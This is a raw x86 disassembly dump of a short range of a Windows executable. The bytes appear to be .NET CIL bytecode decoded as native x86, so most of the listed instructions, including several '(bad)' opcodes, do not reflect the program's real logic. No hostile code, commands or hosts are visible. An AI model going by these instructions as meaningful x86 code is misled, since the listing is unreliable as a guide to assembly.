  403039:	01 16                	add    %edx,(%esi)
  40303b:	fe 01                	incb   (%ecx)
  40303d:	13 14 11             	adc    (%ecx,%edx,1),%edx
  403040:	14 2c                	adc    $0x2c,%al
  403042:	0c 00                	or     $0x0,%al
  403044:	72 17                	jb     0x40305d
  403046:	3d 00 70 73 9d       	cmp    $0x9d737000,%eax
  40304b:	00 00                	add    %al,(%eax)
  40304d:	0a 7a 11             	or     0x11(%edx),%bh
  403050:	0c 28                	or     $0x28,%al
  403052:	9e                   	sahf
  403053:	00 00                	add    %al,(%eax)
  403055:	0a 13                	or     (%ebx),%dl
  403057:	0d 11 0d 6f 9f       	or     $0x9f6f0d11,%eax
  40305c:	00 00                	add    %al,(%eax)
  40305e:	0a 11                	or     (%ecx),%dl
  403060:	0d 6f a0 00 00       	or     $0xa06f,%eax
  403065:	0a 11                	or     (%ecx),%dl
  403067:	0d 6f a1 00 00       	or     $0xa16f,%eax
  40306c:	0a 11                	or     (%ecx),%dl
  40306e:	0d 6f a2 00 00       	or     $0xa26f,%eax
  403073:	0a 11                	or     (%ecx),%dl
  403075:	0d 6f a3 00 00       	or     $0xa36f,%eax
  40307a:	0a 11                	or     (%ecx),%dl
  40307c:	0d 6f a4 00 00       	or     $0xa46f,%eax
  403081:	0a 11                	or     (%ecx),%dl
  403083:	0d 6f a5 00 00       	or     $0xa56f,%eax
  403088:	0a 11                	or     (%ecx),%dl
  40308a:	0d 6f a6 00 00       	or     $0xa66f,%eax
  40308f:	0a 73 a7             	or     -0x59(%ebx),%dh
  403092:	00 00                	add    %al,(%eax)
  403094:	0a 13                	or     (%ebx),%dl
  403096:	0e                   	push   %cs
  403097:	11 0a                	adc    %ecx,(%edx)
  403099:	11 0e                	adc    %ecx,(%esi)
  40309b:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40309e:	00 06                	add    %al,(%esi)
  4030a0:	13 0f                	adc    (%edi),%ecx
  4030a2:	11 0f                	adc    %ecx,(%edi)
  4030a4:	13 15 2b 00 11 15    	adc    0x1511002b,%edx
  4030aa:	2a 00                	sub    (%eax),%al
  4030ac:	1b 30                	sbb    (%eax),%esi
  4030ae:	07                   	pop    %es
  4030af:	00 87 00 00 00 11    	add    %al,0x11000000(%edi)
  4030b5:	00 00                	add    %al,(%eax)
  4030b7:	11 00                	adc    %eax,(%eax)
  4030b9:	73 a8                	jae    0x403063
  4030bb:	00 00                	add    %al,(%eax)
  4030bd:	0a 0a                	or     (%edx),%cl
  4030bf:	02 73 a9             	add    -0x57(%ebx),%dh
  4030c2:	00 00                	add    %al,(%eax)
  4030c4:	0a 0b                	or     (%ebx),%cl
  4030c6:	06                   	push   %es
  4030c7:	02 6f aa             	add    -0x56(%edi),%ch
  4030ca:	00 00                	add    %al,(%eax)
  4030cc:	0a 6f 50             	or     0x50(%edi),%ch
  4030cf:	00 00                	add    %al,(%eax)
  4030d1:	0a 07                	or     (%edi),%al
  4030d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4030d4:	ab                   	stos   %eax,%es:(%edi)
  4030d5:	00 00                	add    %al,(%eax)
  4030d7:	0a 00                	or     (%eax),%al
  4030d9:	06                   	push   %es
  4030da:	02 6f aa             	add    -0x56(%edi),%ch
  4030dd:	00 00                	add    %al,(%eax)
  4030df:	0a 6f 50             	or     0x50(%edi),%ch
  4030e2:	00 00                	add    %al,(%eax)
  4030e4:	0a 03                	or     (%ebx),%al
  4030e6:	73 ac                	jae    0x403094
  4030e8:	00 00                	add    %al,(%eax)
  4030ea:	0a 17                	or     (%edi),%dl
  4030ec:	8d 51 00             	lea    0x0(%ecx),%edx
  4030ef:	00 01                	add    %al,(%ecx)
  4030f1:	25 16 07 a2 6f       	and    $0x6fa20716,%eax
  4030f6:	ad                   	lods   %ds:(%esi),%eax
  4030f7:	00 00                	add    %al,(%eax)
  4030f9:	0a 00                	or     (%eax),%al
  4030fb:	73 ae                	jae    0x4030ab
  4030fd:	00 00                	add    %al,(%eax)
  4030ff:	0a 0c 00             	or     (%eax,%eax,1),%cl
  403102:	06                   	push   %es
  403103:	08 72 63             	or     %dh,0x63(%edx)
  403106:	3d 00 70 28 af       	cmp    $0xaf287000,%eax
  40310b:	00 00                	add    %al,(%eax)
  40310d:	0a 73 79             	or     0x79(%ebx),%dh
  403110:	00 00                	add    %al,(%eax)
  403112:	0a 73 7a             	or     0x7a(%ebx),%dh
  403115:	00 00                	add    %al,(%eax)
  403117:	0a 6f b0             	or     -0x50(%edi),%ch
  40311a:	00 00                	add    %al,(%eax)
  40311c:	0a 00                	or     (%eax),%al
  40311e:	08 6f b1             	or     %ch,-0x4f(%edi)
  403121:	00 00                	add    %al,(%eax)
  403123:	0a 72 63             	or     0x63(%edx),%dh
  403126:	3d 00 70 1a 73       	cmp    $0x731a7000,%eax
  40312b:	b2 00                	mov    $0x0,%dl
  40312d:	00 0a                	add    %cl,(%edx)
  40312f:	0d de 0b 08 2c       	or     $0x2c080bde,%eax
  403134:	07                   	pop    %es
  403135:	08 6f 21             	or     %ch,0x21(%edi)
  403138:	00 00                	add    %al,(%eax)
  40313a:	0a 00                	or     (%eax),%al
  40313c:	dc 09                	fmull  (%ecx)
  40313e:	2a 00                	sub    (%eax),%al
  403140:	01 10                	add    %edx,(%eax)
  403142:	00 00                	add    %al,(%eax)
  403144:	02 00                	add    (%eax),%al
  403146:	49                   	dec    %ecx
  403147:	00 31                	add    %dh,(%ecx)
  403149:	7a 00                	jp     0x40314b
  40314b:	0b 00                	or     (%eax),%eax
  40314d:	00 00                	add    %al,(%eax)
  40314f:	00 22                	add    %ah,(%edx)
  403151:	02 28                	add    (%eax),%ch
  403153:	22 00                	and    (%eax),%al
  403155:	00 0a                	add    %cl,(%edx)
  403157:	00 2a                	add    %ch,(%edx)
  403159:	2e 73 27             	jae,pn 0x403183
  40315c:	00 00                	add    %al,(%eax)
  40315e:	06                   	push   %es
  40315f:	80 25 00 00 04 2a 22 	andb   $0x22,0x2a040000
  403166:	02 28                	add    (%eax),%ch
  403168:	22 00                	and    (%eax),%al
  40316a:	00 0a                	add    %cl,(%edx)
  40316c:	00 2a                	add    %ch,(%edx)
  40316e:	46                   	inc    %esi
  40316f:	03 7e 0b             	add    0xb(%esi),%edi
  403172:	00 00                	add    %al,(%eax)
  403174:	04 28                	add    $0x28,%al
  403176:	37                   	aaa
  403177:	00 00                	add    %al,(%eax)
  403179:	0a 28                	or     (%eax),%ch
  40317b:	2b 00                	sub    (%eax),%eax
  40317d:	00 0a                	add    %cl,(%edx)
  40317f:	2a 22                	sub    (%edx),%ah
  403181:	02 28                	add    (%eax),%ch
  403183:	22 00                	and    (%eax),%al
  403185:	00 0a                	add    %cl,(%edx)
  403187:	00 2a                	add    %ch,(%edx)
  403189:	00 00                	add    %al,(%eax)
  40318b:	00 1b                	add    %bl,(%ebx)
  40318d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403190:	fd                   	std
  403191:	01 00                	add    %eax,(%eax)
  403193:	00 12                	add    %dl,(%edx)
  403195:	00 00                	add    %al,(%eax)
  403197:	11 02                	adc    %eax,(%edx)
  403199:	7b 26                	jnp    0x4031c1
  40319b:	00 00                	add    %al,(%eax)
  40319d:	04 0a                	add    $0xa,%al
  40319f:	06                   	push   %es
  4031a0:	2c 08                	sub    $0x8,%al
  4031a2:	2b 00                	sub    (%eax),%eax
  4031a4:	06                   	push   %es
  4031a5:	17                   	pop    %ss
  4031a6:	2e 04 2b             	cs add $0x2b,%al
  4031a9:	07                   	pop    %es
  4031aa:	2b 6a 38             	sub    0x38(%edx),%ebp
  4031ad:	5e                   	pop    %esi
  4031ae:	01 00                	add    %eax,(%eax)
  4031b0:	00 00                	add    %al,(%eax)
  4031b2:	02 17                	add    (%edi),%dl
  4031b4:	7d 29                	jge    0x4031df
  4031b6:	00 00                	add    %al,(%eax)
  4031b8:	04 02                	add    $0x2,%al
  4031ba:	7b 28                	jnp    0x4031e4
  4031bc:	00 00                	add    %al,(%eax)
  4031be:	04 7b                	add    $0x7b,%al
  4031c0:	0d 00 00 04 6f       	or     $0x6f040000,%eax
  4031c5:	b3 00                	mov    $0x0,%bl
  4031c7:	00 0a                	add    %cl,(%edx)
  4031c9:	00 38                	add    %bh,(%eax)
  4031cb:	86 01                	xchg   %al,(%ecx)
  4031cd:	00 00                	add    %al,(%eax)
  4031cf:	00 02                	add    %al,(%edx)
  4031d1:	7b 28                	jnp    0x4031fb
  4031d3:	00 00                	add    %al,(%eax)
  4031d5:	04 7b                	add    $0x7b,%al
  4031d7:	0d 00 00 04 6f       	or     $0x6f040000,%eax
  4031dc:	b4 00                	mov    $0x0,%ah
  4031de:	00 0a                	add    %cl,(%edx)
  4031e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4031e1:	b5 00                	mov    $0x0,%ch
  4031e3:	00 0a                	add    %cl,(%edx)
  4031e5:	0b 12                	or     (%edx),%edx
  4031e7:	01 28                	add    %ebp,(%eax)
  4031e9:	b6 00                	mov    $0x0,%dh
  4031eb:	00 0a                	add    %cl,(%edx)
  4031ed:	2d 43 02 16 25       	sub    $0x25160243,%eax
  4031f2:	0a 7d 26             	or     0x26(%ebp),%bh
  4031f5:	00 00                	add    %al,(%eax)
  4031f7:	04 02                	add    $0x2,%al
  4031f9:	07                   	pop    %es
  4031fa:	7d 2e                	jge    0x40322a
  4031fc:	00 00                	add    %al,(%eax)
  4031fe:	04 02                	add    $0x2,%al
  403200:	0c 02                	or     $0x2,%al
  403202:	7c 27                	jl     0x40322b
  403204:	00 00                	add    %al,(%eax)
  403206:	04 12                	add    $0x12,%al
  403208:	01 12                	add    %edx,(%edx)
  40320a:	02 28                	add    (%eax),%ch
  40320c:	0a 00                	or     (%eax),%al
  40320e:	00 2b                	add    %ch,(%ebx)
  403210:	00 dd                	add    %bl,%ch
  403212:	7e 01                	jle    0x403215
  403214:	00 00                	add    %al,(%eax)
  403216:	02 7b 2e             	add    0x2e(%ebx),%bh
  403219:	00 00                	add    %al,(%eax)
  40321b:	04 0b                	add    $0xb,%al
  40321d:	02 7c 2e 00          	add    0x0(%esi,%ebp,1),%bh
  403221:	00 04 fe             	add    %al,(%esi,%edi,8)
  403224:	15 08 00 00 1b       	adc    $0x1b000008,%eax
  403229:	02 15 25 0a 7d 26    	add    0x267d0a25,%dl
  40322f:	00 00                	add    %al,(%eax)
  403231:	04 02                	add    $0x2,%al
  403233:	12 01                	adc    (%ecx),%al
  403235:	28 b8 00 00 0a 7d    	sub    %bh,0x7d0a0000(%eax)
  40323b:	2d 00 00 04 02       	sub    $0x2040000,%eax
  403240:	02 7b 2d             	add    0x2d(%ebx),%bh
  403243:	00 00                	add    %al,(%eax)
  403245:	04 7d                	add    $0x7d,%al
  403247:	2a 00                	sub    (%eax),%al
  403249:	00 04 02             	add    %al,(%edx,%eax,1)
  40324c:	14 7d                	adc    $0x7d,%al
  40324e:	2d 00 00 04 02       	sub    $0x2040000,%eax
  403253:	02 7b 2a             	add    0x2a(%ebx),%bh
  403256:	00 00                	add    %al,(%eax)
  403258:	04 6f                	add    $0x6f,%al
  40325a:	b9 00 00 0a 7d       	mov    $0x7d0a0000,%ecx
  40325f:	2b 00                	sub    (%eax),%eax
  403261:	00 04 02             	add    %al,(%edx,%eax,1)
  403264:	02 7b 2a             	add    0x2a(%ebx),%bh
  403267:	00 00                	add    %al,(%eax)
  403269:	04 6f                	add    $0x6f,%al
  40326b:	ba 00 00 0a 7d       	mov    $0x7d0a0000,%edx
  403270:	2c 00                	sub    $0x0,%al
  403272:	00 04 02             	add    %al,(%edx,%eax,1)
  403275:	7b 2c                	jnp    0x4032a3
  403277:	00 00                	add    %al,(%eax)
  403279:	04 72                	add    $0x72,%al
  40327b:	75 3d                	jne    0x4032ba
  40327d:	00 70 6f             	add    %dh,0x6f(%eax)
  403280:	bb 00 00 0a 00       	mov    $0xa0000,%ebx
  403285:	02 7b 2c             	add    0x2c(%ebx),%bh
  403288:	00 00                	add    %al,(%eax)
  40328a:	04 28                	add    $0x28,%al
  40328c:	bc 00 00 0a 6f       	mov    $0x6f0a0000,%esp
  403291:	bd 00 00 0a 00       	mov    $0xa0000,%ebp
  403296:	02 7b 2c             	add    0x2c(%ebx),%bh
  403299:	00 00                	add    %al,(%eax)
  40329b:	04 02                	add    $0x2,%al
  40329d:	7b 28                	jnp    0x4032c7
  40329f:	00 00                	add    %al,(%eax)
  4032a1:	04 7b                	add    $0x7b,%al
  4032a3:	0e                   	push   %cs
  4032a4:	00 00                	add    %al,(%eax)
  4032a6:	04 8e                	add    $0x8e,%al
  4032a8:	69 6a 6f be 00 00 0a 	imul   $0xa0000be,0x6f(%edx),%ebp
  4032af:	00 02                	add    %al,(%edx)
  4032b1:	7b 2c                	jnp    0x4032df
  4032b3:	00 00                	add    %al,(%eax)
  4032b5:	04 6f                	add    $0x6f,%al
  4032b7:	bf 00 00 0a 02       	mov    $0x20a0000,%edi
  4032bc:	7b 28                	jnp    0x4032e6
  4032be:	00 00                	add    %al,(%eax)
  4032c0:	04 7b                	add    $0x7b,%al
  4032c2:	0e                   	push   %cs
  4032c3:	00 00                	add    %al,(%eax)
  4032c5:	04 16                	add    $0x16,%al
  4032c7:	02 7b 28             	add    0x28(%ebx),%bh
  4032ca:	00 00                	add    %al,(%eax)
  4032cc:	04 7b                	add    $0x7b,%al
  4032ce:	0e                   	push   %cs
  4032cf:	00 00                	add    %al,(%eax)
  4032d1:	04 8e                	add    $0x8e,%al
  4032d3:	69 6f c0 00 00 0a 6f 	imul   $0x6f0a0000,-0x40(%edi),%ebp
  4032da:	c1 00 00             	roll   $0x0,(%eax)
  4032dd:	0a 0d 12 03 28 c2    	or     0xc2280312,%cl
  4032e3:	00 00                	add    %al,(%eax)
  4032e5:	0a 2d 43 02 17 25    	or     0x25170243,%ch
  4032eb:	0a 7d 26             	or     0x26(%ebp),%bh
  4032ee:	00 00                	add    %al,(%eax)
  4032f0:	04 02                	add    $0x2,%al
  4032f2:	09 7d 2f             	or     %edi,0x2f(%ebp)
  4032f5:	00 00                	add    %al,(%eax)
  4032f7:	04 02                	add    $0x2,%al
  4032f9:	0c 02                	or     $0x2,%al
  4032fb:	7c 27                	jl     0x403324
  4032fd:	00 00                	add    %al,(%eax)
  4032ff:	04 12                	add    $0x12,%al
  403301:	03 12                	add    (%edx),%edx
  403303:	02 28                	add    (%eax),%ch
  403305:	0b 00                	or     (%eax),%eax
  403307:	00 2b                	add    %ch,(%ebx)
  403309:	00 dd                	add    %bl,%ch
  40330b:	85 00                	test   %eax,(%eax)
  40330d:	00 00                	add    %al,(%eax)
  40330f:	02 7b 2f             	add    0x2f(%ebx),%bh
  403312:	00 00                	add    %al,(%eax)
  403314:	04 0d                	add    $0xd,%al
  403316:	02 7c 2f 00          	add    0x0(%edi,%ebp,1),%bh
  40331a:	00 04 fe             	add    %al,(%esi,%edi,8)
  40331d:	15 1c 00 00 01       	adc    $0x100001c,%eax
  403322:	02 15 25 0a 7d 26    	add    0x267d0a25,%dl
  403328:	00 00                	add    %al,(%eax)
  40332a:	04 12                	add    $0x12,%al
  40332c:	03 28                	add    (%eax),%ebp
  40332e:	c3                   	ret
  40332f:	00 00                	add    %al,(%eax)
  403331:	0a 00                	or     (%eax),%al
  403333:	02 7b 2c             	add    0x2c(%ebx),%bh
  403336:	00 00                	add    %al,(%eax)
  403338:	04 6f                	add    $0x6f,%al
  40333a:	c4 00                	les    (%eax),%eax
  40333c:	00 0a                	add    %cl,(%edx)
  40333e:	00 00                	add    %al,(%eax)
  403340:	02 14 7d 2a 00 00 04 	add    0x400002a(,%edi,2),%dl
  403347:	02 14 7d 2b 00 00 04 	add    0x400002b(,%edi,2),%dl
  40334e:	02 14 7d 2c 00 00 04 	add    0x400002c(,%edi,2),%dl
  403355:	02 7b 29             	add    0x29(%ebx),%bh
  403358:	00 00                	add    %al,(%eax)
  40335a:	04 13                	add    $0x13,%al
  40335c:	04 11                	add    $0x11,%al
  40335e:	04 3a                	add    $0x3a,%al
  403360:	6b fe ff             	imul   $0xffffffff,%esi,%edi
  403363:	ff                   	lcall  (bad)
  403364:	de 1a                	ficomps (%edx)
  403366:	13 05 02 1f fe 7d    	adc    0x7dfe1f02,%eax
  40336c:	26 00 00             	add    %al,%es:(%eax)
  40336f:	04 02                	add    $0x2,%al
  403371:	7c 27                	jl     0x40339a
  403373:	00 00                	add    %al,(%eax)
  403375:	04 11                	add    $0x11,%al
  403377:	05 28 c5 00 00       	add    $0xc528,%eax
  40337c:	0a 00                	or     (%eax),%al
  40337e:	de 14 02             	ficoms (%edx,%eax,1)
  403381:	1f                   	pop    %ds
  403382:	fe                   	(bad)
  403383:	7d 26                	jge    0x4033ab
  403385:	00 00                	add    %al,(%eax)
  403387:	04 02                	add    $0x2,%al
  403389:	7c 27                	jl     0x4033b2
  40338b:	00 00                	add    %al,(%eax)
  40338d:	04 28                	add    $0x28,%al
  40338f:	c6 00 00             	movb   $0x0,(%eax)
  403392:	0a 00                	or     (%eax),%al
  403394:	2a 00                	sub    (%eax),%al
  403396:	00 00                	add    %al,(%eax)
  403398:	41                   	inc    %ecx
  403399:	1c 00                	sbb    $0x0,%al
  40339b:	00 00                	add    %al,(%eax)
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 07                	add    %al,(%edi)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 c7                	add    %al,%bh
  4033a5:	01 00                	add    %eax,(%eax)
  4033a7:	00 ce                	add    %cl,%dh
  4033a9:	01 00                	add    %eax,(%eax)
  4033ab:	00 1a                	add    %bl,(%edx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	00 1d 00 00 01 06    	add    %bl,0x6010000
  4033b5:	2a 22                	sub    (%edx),%ah
  4033b7:	02 28                	add    (%eax),%ch
  4033b9:	22 00                	and    (%eax),%al
  4033bb:	00 0a                	add    %cl,(%edx)
  4033bd:	00 2a                	add    %ch,(%edx)
  4033bf:	00 1b                	add    %bl,(%ebx)
  4033c1:	30 05 00 92 01 00    	xor    %al,0x19200
  4033c7:	00 13                	add    %dl,(%ebx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	11 02                	adc    %eax,(%edx)
  4033cd:	7b 30                	jnp    0x4033ff
  4033cf:	00 00                	add    %al,(%eax)
  4033d1:	04 0a                	add    $0xa,%al
  4033d3:	06                   	push   %es
  4033d4:	2c 08                	sub    $0x8,%al
  4033d6:	2b 00                	sub    (%eax),%eax
  4033d8:	06                   	push   %es
  4033d9:	17                   	pop    %ss
  4033da:	2e 07                	cs pop %es
  4033dc:	2b 0a                	sub    (%edx),%ecx
  4033de:	38 9c 00 00 00 38 11 	cmp    %bl,0x11380000(%eax,%eax,1)
  4033e5:	01 00                	add    %eax,(%eax)
  4033e7:	00 00                	add    %al,(%eax)
  4033e9:	02 02                	add    (%edx),%al
  4033eb:	7b 32                	jnp    0x40341f
  4033ed:	00 00                	add    %al,(%eax)
  4033ef:	04 75                	add    $0x75,%al
  4033f1:	32 00                	xor    (%eax),%al
  4033f3:	00 01                	add    %al,(%ecx)
  4033f5:	7d 34                	jge    0x40342b
  4033f7:	00 00                	add    %al,(%eax)
  4033f9:	04 02                	add    $0x2,%al
  4033fb:	7b 34                	jnp    0x403431
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	04 14                	add    $0x14,%al
  403401:	fe 03                	incb   (%ebx)
  403403:	0b 07                	or     (%edi),%eax
  403405:	39 9c 00 00 00 00 02 	cmp    %ebx,0x2000000(%eax,%eax,1)
  40340c:	7b 33                	jnp    0x403441
  40340e:	00 00                	add    %al,(%eax)
  403410:	04 02                	add    $0x2,%al
  403412:	7b 32                	jnp    0x403446
  403414:	00 00                	add    %al,(%eax)
  403416:	04 6f                	add    $0x6f,%al
  403418:	c7 00 00 0a 72 a7    	movl   $0xa7720a00,(%eax)
  40341e:	3d 00 70 02 7b       	cmp    $0x7b027000,%eax
  403423:	34 00                	xor    $0x0,%al
  403425:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403428:	c8 00 00 0a          	enter  $0x0,$0xa
  40342c:	25 2d 04 26 14       	and    $0x1426042d,%eax
  403431:	2b 05 6f c7 00 00    	sub    0xc76f,%eax
  403437:	0a 28                	or     (%eax),%ch
  403439:	c9                   	leave
  40343a:	00 00                	add    %al,(%eax)
  40343c:	0a 1f                	or     (%edi),%bl
  40343e:	0c 73                	or     $0x73,%al
  403440:	ca 00 00             	lret   $0x0
  403443:	0a 28                	or     (%eax),%ch
  403445:	1e                   	push   %ds
  403446:	00 00                	add    %al,(%eax)
  403448:	06                   	push   %es
  403449:	6f                   	outsl  %ds:(%esi),(%dx)
  40344a:	c1 00 00             	roll   $0x0,(%eax)
  40344d:	0a 0c 12             	or     (%edx,%edx,1),%cl
  403450:	02 28                	add    (%eax),%ch
  403452:	c2 00 00             	ret    $0x0
  403455:	0a 2d 43 02 16 25    	or     0x25160243,%ch
  40345b:	0a 7d 30             	or     0x30(%ebp),%bh
  40345e:	00 00                	add    %al,(%eax)
  403460:	04 02                	add    $0x2,%al
  403462:	08 7d 35             	or     %bh,0x35(%ebp)
  403465:	00 00                	add    %al,(%eax)
  403467:	04 02                	add    $0x2,%al
  403469:	0d 02 7c 31 00       	or     $0x317c02,%eax
  40346e:	00 04 12             	add    %al,(%edx,%edx,1)
  403471:	02 12                	add    (%edx),%dl
  403473:	03 28                	add    (%eax),%ebp
  403475:	0c 00                	or     $0x0,%al
  403477:	00 2b                	add    %ch,(%ebx)
  403479:	00 dd                	add    %bl,%ch
  40347b:	de 00                	fiadds (%eax)
  40347d:	00 00                	add    %al,(%eax)
  40347f:	02 7b 35             	add    0x35(%ebx),%bh
  403482:	00 00                	add    %al,(%eax)
  403484:	04 0c                	add    $0xc,%al
  403486:	02 7c 35 00          	add    0x0(%ebp,%esi,1),%bh
  40348a:	00 04 fe             	add    %al,(%esi,%edi,8)
  40348d:	15 1c 00 00 01       	adc    $0x100001c,%eax
  403492:	02 15 25 0a 7d 30    	add    0x307d0a25,%dl
  403498:	00 00                	add    %al,(%eax)
  40349a:	04 12                	add    $0x12,%al
  40349c:	02 28                	add    (%eax),%ch
  40349e:	c3                   	ret
  40349f:	00 00                	add    %al,(%eax)
  4034a1:	0a 00                	or     (%eax),%al
  4034a3:	00 2b                	add    %ch,(%ebx)
  4034a5:	79 00                	jns    0x4034a7
  4034a7:	02 7b 33             	add    0x33(%ebx),%bh
  4034aa:	00 00                	add    %al,(%eax)
  4034ac:	04 02                	add    $0x2,%al
  4034ae:	7b 32                	jnp    0x4034e2
  4034b0:	00 00                	add    %al,(%eax)
  4034b2:	04 6f                	add    $0x6f,%al
  4034b4:	50                   	push   %eax
  4034b5:	00 00                	add    %al,(%eax)
  4034b7:	0a 1f                	or     (%edi),%bl
  4034b9:	0c 73                	or     $0x73,%al
  4034bb:	ca 00 00             	lret   $0x0
  4034be:	0a 28                	or     (%eax),%ch
  4034c0:	1e                   	push   %ds
  4034c1:	00 00                	add    %al,(%eax)
  4034c3:	06                   	push   %es
  4034c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c5:	c1 00 00             	roll   $0x0,(%eax)
  4034c8:	0a 13                	or     (%ebx),%dl
  4034ca:	04 12                	add    $0x12,%al
  4034cc:	04 28                	add    $0x28,%al
  4034ce:	c2 00 00             	ret    $0x0
  4034d1:	0a 2d 42 02 17 25    	or     0x25170242,%ch
  4034d7:	0a 7d 30             	or     0x30(%ebp),%bh
  4034da:	00 00                	add    %al,(%eax)
  4034dc:	04 02                	add    $0x2,%al
  4034de:	11 04 7d 35 00 00 04 	adc    %eax,0x4000035(,%edi,2)
  4034e5:	02 0d 02 7c 31 00    	add    0x317c02,%cl
  4034eb:	00 04 12             	add    %al,(%edx,%edx,1)
  4034ee:	04 12                	add    $0x12,%al
  4034f0:	03 28                	add    (%eax),%ebp
  4034f2:	0c 00                	or     $0x0,%al
  4034f4:	00 2b                	add    %ch,(%ebx)
  4034f6:	00 de                	add    %bl,%dh
  4034f8:	64 02 7b 35          	add    %fs:0x35(%ebx),%bh
  4034fc:	00 00                	add    %al,(%eax)
  4034fe:	04 13                	add    $0x13,%al
  403500:	04 02                	add    $0x2,%al
  403502:	7c 35                	jl     0x403539
  403504:	00 00                	add    %al,(%eax)
  403506:	04 fe                	add    $0xfe,%al
  403508:	15 1c 00 00 01       	adc    $0x100001c,%eax
  40350d:	02 15 25 0a 7d 30    	add    0x307d0a25,%dl
  403513:	00 00                	add    %al,(%eax)
  403515:	04 12                	add    $0x12,%al
  403517:	04 28                	add    $0x28,%al
  403519:	c3                   	ret
  40351a:	00 00                	add    %al,(%eax)
  40351c:	0a 00                	or     (%eax),%al
  40351e:	00 de                	add    %bl,%dh
  403520:	21 13                	and    %edx,(%ebx)
  403522:	05 02 1f fe 7d       	add    $0x7dfe1f02,%eax
  403527:	30 00                	xor    %al,(%eax)
  403529:	00 04 02             	add    %al,(%edx,%eax,1)
  40352c:	14 7d                	adc    $0x7d,%al
  40352e:	34 00                	xor    $0x0,%al
  403530:	00 04 02             	add    %al,(%edx,%eax,1)
  403533:	7c 31                	jl     0x403566
  403535:	00 00                	add    %al,(%eax)
  403537:	04 11                	add    $0x11,%al
  403539:	05 28 c5 00 00       	add    $0xc528,%eax
  40353e:	0a 00                	or     (%eax),%al
  403540:	de 1b                	ficomps (%ebx)
  403542:	02 1f                	add    (%edi),%bl
  403544:	fe                   	(bad)
  403545:	7d 30                	jge    0x403577
  403547:	00 00                	add    %al,(%eax)
  403549:	04 02                	add    $0x2,%al
  40354b:	14 7d                	adc    $0x7d,%al
  40354d:	34 00                	xor    $0x0,%al
  40354f:	00 04 02             	add    %al,(%edx,%eax,1)
  403552:	7c 31                	jl     0x403585
  403554:	00 00                	add    %al,(%eax)
  403556:	04 28                	add    $0x28,%al
  403558:	c6 00 00             	movb   $0x0,(%eax)
  40355b:	0a 00                	or     (%eax),%al
  40355d:	2a 00                	sub    (%eax),%al
  40355f:	00 41 1c             	add    %al,0x1c(%ecx)
  403562:	00 00                	add    %al,(%eax)
  403564:	00 00                	add    %al,(%eax)
  403566:	00 00                	add    %al,(%eax)
  403568:	07                   	pop    %es
  403569:	00 00                	add    %al,(%eax)
  40356b:	00 4e 01             	add    %cl,0x1(%esi)
  40356e:	00 00                	add    %al,(%eax)
  403570:	55                   	push   %ebp
  403571:	01 00                	add    %eax,(%eax)
  403573:	00 21                	add    %ah,(%ecx)
  403575:	00 00                	add    %al,(%eax)
  403577:	00 1d 00 00 01 06    	add    %bl,0x6010000
  40357d:	2a 2e                	sub    (%esi),%ch
  40357f:	73 30                	jae    0x4035b1
  403581:	00 00                	add    %al,(%eax)
  403583:	06                   	push   %es
  403584:	80 36 00             	xorb   $0x0,(%esi)
  403587:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40358a:	22 02                	and    (%edx),%al
  40358c:	28 22                	sub    %ah,(%edx)
  40358e:	00 00                	add    %al,(%eax)
  403590:	0a 00                	or     (%eax),%al
  403592:	2a 5a 03             	sub    0x3(%edx),%bl
  403595:	6f                   	outsl  %ds:(%esi),(%dx)
  403596:	cb                   	lret
  403597:	00 00                	add    %al,(%eax)
  403599:	0a 6f cc             	or     -0x34(%edi),%ch
  40359c:	00 00                	add    %al,(%eax)
  40359e:	0a 72 ad             	or     -0x53(%edx),%dh
  4035a1:	3d 00 70 28 18       	cmp    $0x18287000,%eax
  4035a6:	00 00                	add    %al,(%eax)
  4035a8:	0a 2a                	or     (%edx),%ch
  4035aa:	22 02                	and    (%edx),%al
  4035ac:	28 22                	sub    %ah,(%edx)
  4035ae:	00 00                	add    %al,(%eax)
  4035b0:	0a 00                	or     (%eax),%al
  4035b2:	2a 00                	sub    (%eax),%al
  4035b4:	1b 30                	sbb    (%eax),%esi
  4035b6:	03 00                	add    (%eax),%eax
  4035b8:	ac                   	lods   %ds:(%esi),%al
  4035b9:	01 00                	add    %eax,(%eax)
  4035bb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4035be:	00 11                	add    %dl,(%ecx)
  4035c0:	02 7b 38             	add    0x38(%ebx),%bh
  4035c3:	00 00                	add    %al,(%eax)
  4035c5:	04 0a                	add    $0xa,%al
  4035c7:	06                   	push   %es
  4035c8:	2c 02                	sub    $0x2,%al
  4035ca:	2b 02                	sub    (%edx),%eax
  4035cc:	2b 7b 00             	sub    0x0(%ebx),%edi
  4035cf:	02 02                	add    (%edx),%al
  4035d1:	7b 3b                	jnp    0x40360e
  4035d3:	00 00                	add    %al,(%eax)
  4035d5:	04 6f                	add    $0x6f,%al
  4035d7:	cd 00                	int    $0x0
  4035d9:	00 0a                	add    %cl,(%edx)
  4035db:	6f                   	outsl  %ds:(%esi),(%dx)
  4035dc:	ce                   	into
  4035dd:	00 00                	add    %al,(%eax)
  4035df:	0a 6f cf             	or     -0x31(%edi),%ch
  4035e2:	00 00                	add    %al,(%eax)
  4035e4:	0a 6f 16             	or     0x16(%edi),%ch
  4035e7:	00 00                	add    %al,(%eax)
  4035e9:	0a 7d 3d             	or     0x3d(%ebp),%bh
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	04 02                	add    $0x2,%al
  4035f0:	7b 3c                	jnp    0x40362e
  4035f2:	00 00                	add    %al,(%eax)
  4035f4:	04 72                	add    $0x72,%al
  4035f6:	d1 3d 00 70 02 7b    	sarl   $1,0x7b027000
  4035fc:	3d 00 00 04 28       	cmp    $0x28040000,%eax
  403601:	71 00                	jno    0x403603
  403603:	00 0a                	add    %cl,(%edx)
  403605:	12 02                	adc    (%edx),%al
  403607:	fe                   	(bad)
  403608:	15 09 00 00 1b       	adc    $0x1b000009,%eax
  40360d:	08 28                	or     %ch,(%eax)
  40360f:	1d 00 00 06 6f       	sbb    $0x6f060000,%eax
